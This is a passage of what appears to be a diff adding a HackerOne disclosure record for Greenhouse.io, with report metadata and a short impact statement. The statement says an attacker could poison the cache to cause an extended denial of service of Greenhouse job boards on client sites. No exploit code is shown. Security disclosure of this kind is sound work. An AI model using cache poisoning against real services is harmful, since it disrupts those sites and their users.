This would really ensure that the fix would be foolproof.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>As reiterated in the previous reports, an attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://app.greenhouse.io", 
+            "about": "Software to optimize your entire recruiting and onboarding process.", 
+            "twitter_handle": "", 
+            "name": "Greenhouse.io"
+        }, 
+        "handle": "greenhouse", 
+        "url": "https://hackerone.com/greenhouse", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/312/ed3e97e66e1308f7cd4c8ebdab7110ddfeaa1378_small.jpg?1412369170", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/312/d8a5615eac371f9e26a4ab3e56b8c32370280a0c_medium.jpg?1412369170"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 312, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
